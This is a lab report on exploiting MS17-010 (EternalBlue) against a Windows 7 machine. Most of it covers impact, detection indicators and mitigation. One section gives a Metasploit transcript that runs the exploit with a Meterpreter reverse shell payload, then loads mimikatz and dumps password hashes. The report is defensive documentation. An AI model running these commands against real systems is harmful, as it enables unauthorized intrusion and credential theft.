# MS17-010 (EternalBlue) Vulnerability – Authorized Lab Report

## ⚠️ Legal & Ethical Notice
This document is created **strictly for educational purposes** within an **authorized lab environment**.
All testing was performed on systems owned by the tester or with explicit permission.
Unauthorized exploitation of systems is illegal and unethical.

---

## 📌 Overview
This report documents the analysis and impact of **MS17-010 (EternalBlue)** on a vulnerable Windows system in a controlled lab environment.

- **Vulnerability:** MS17-010
- **Protocol:** SMBv1
- **Affected OS:** Windows 7 SP1 x64
- **Risk Level:** Critical
- **Impact:** Remote Code Execution → SYSTEM-level access

---

## 🧠 Vulnerability Summary
MS17-010 is a critical SMB vulnerability disclosed by Microsoft in 2017.
It allows **unauthenticated remote attackers** to execute arbitrary code by sending crafted SMB packets.

Key characteristics:
- Network-based
- No user interaction required
- Exploitable over port **445**
- Widely weaponized (e.g., WannaCry)

---

## 🧪 Lab Environment
| Component | Details |
|--------|--------|
| Attacker | Linux-based penetration testing VM |
| Target | Windows 7 SP1 x64 |
| Network | Isolated private lab |
| Tools | Industry-standard penetration testing framework |

---

## 🔍 Vulnerability Validation
The target system was identified as:
- Running SMBv1
- Missing MS17-010 security patch
- Accessible over TCP 445

Validation confirmed the system was **likely vulnerable** before exploitation was attempted.

---

## ⚠️ Impact Analysis
Successful exploitation resulted in:
- Remote shell access
- SYSTEM-level privileges
- Credential material exposure
- Full host compromise

### Business Impact
- Complete loss of confidentiality
- Full system control by attacker
- Potential lateral movement risk

---

## 🔐 Post-Exploitation Risk
Once SYSTEM access is achieved, attackers can:
- Extract credential hashes
- Install persistence mechanisms
- Disable security controls
- Pivot to other hosts

This phase highlights why **patch management is critical**.

---

## 🛡️ Detection Indicators (Blue Team)
Common indicators include:
- SMB exploitation attempts on port 445
- Unexpected SMBv1 traffic
- Sudden SYSTEM-level process spawning
- Credential access anomalies

---

## ✅ Mitigation & Prevention
### Immediate Actions
- Apply MS17-010 patch
- Disable SMBv1
- Restrict port 445 access

### Long-Term Security
- Enforce regular patch cycles
- Network segmentation
- Endpoint detection and response (EDR)
- Least privilege enforcement

---

## 🧾 Observed Command Transcript
*(As executed during the lab)*

```

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

```

---

## 🔍 Command Explanation & Effects

### 1. Exploit Module Selection
**Command Observed**
```

use exploit/windows/smb/ms17_010_eternalblue

```

**Purpose**  
Selects the Metasploit exploit module targeting the MS17-010 (EternalBlue) SMB vulnerability.

**Effect**  
- Prepares the framework to target SMBv1
- Loads logic capable of triggering remote code execution
- Focuses the attack on TCP port 445

**Security Impact**  
Allows unauthenticated remote compromise of vulnerable Windows systems.

---

### 2. Payload Configuration
**Command Observed**
```

set payload windows/x64/meterpreter/reverse_tcp

```

**Purpose**  
Defines the payload that will be executed after successful exploitation.

**Effect**  
- Establishes a reverse connection from the target to the attacker
- Spawns a Meterpreter session
- Enables post-exploitation interaction

**Security Impact**  
Creates a persistent interactive session under attacker control.

---

### 3. Exploit Execution
**Command Observed**
```

run

```

**Purpose**  
Launches the exploit with the configured payload.

**Effect**  
- Exploit successfully triggered
- Remote code execution achieved
- Meterpreter session opened

**Security Impact**  
Marks the point of **full system compromise**.

---

## 🧾 Meterpreter Post-Exploitation Commands

```

meterpreter > run post/windows/escalate/getsystem

```

### Privilege Escalation Check
**Purpose**  
Attempts to elevate privileges to SYSTEM.

**Effect**  
- Confirmed SYSTEM-level privileges were already obtained
- No further escalation required

**Security Impact**  
SYSTEM access equals complete control of the host.

---

```

meterpreter > load mimikatz

```

### Credential Access Extension Loading
**Purpose**  
Loads the credential extraction extension (now known as `kiwi`).

**Effect**  
- Enables memory-based credential operations
- Prepares environment for credential extraction

**Security Impact**  
Allows access to sensitive authentication material.

---

```

meterpreter > hashdump

```

### Credential Dumping
**Purpose**  
Extracts password hashes from the compromised system.

**Effect**  
- Retrieved local account credential hashes
- Demonstrated risk of credential exposure
- Showed potential for password cracking or reuse

**Security Impact**  
Compromised credentials can lead to lateral movement and domain compromise.

---

```

meterpreter > ls

```

### File System Interaction
**Purpose**  
Lists directory contents on the target system.

**Effect**  
- Confirmed file system access
- Demonstrated ability to read system data

**Security Impact**  
Attackers can access, modify, or exfiltrate files.

---

## 📊 Attack Flow Summary

| Phase | Result |
|-----|------|
| Exploit Selection | MS17-010 module loaded |
| Payload Setup | Meterpreter reverse shell configured |
| Execution | Remote code execution achieved |
| Privileges | SYSTEM-level access confirmed |
| Post-Exploitation | Credentials and file system accessed |

---

## 🛡️ Defensive Takeaways
- Patch MS17-010 immediately
- Disable SMBv1
- Restrict port 445
- Monitor credential access attempts
- Use EDR to detect Meterpreter activity

---

## 📚 Lessons Learned
- Legacy protocols introduce severe risk
- Network-level vulnerabilities bypass authentication
- Defense-in-depth is essential
- Monitoring SMB traffic is critical

---

## 🧾 References
- Microsoft Security Bulletin MS17-010
- CVE-2017-0144
- MITRE ATT&CK: T1210 (Exploitation of Remote Services)

---

## 👤 Author
**rhshourav**  
Cybersecurity Lab Documentation  
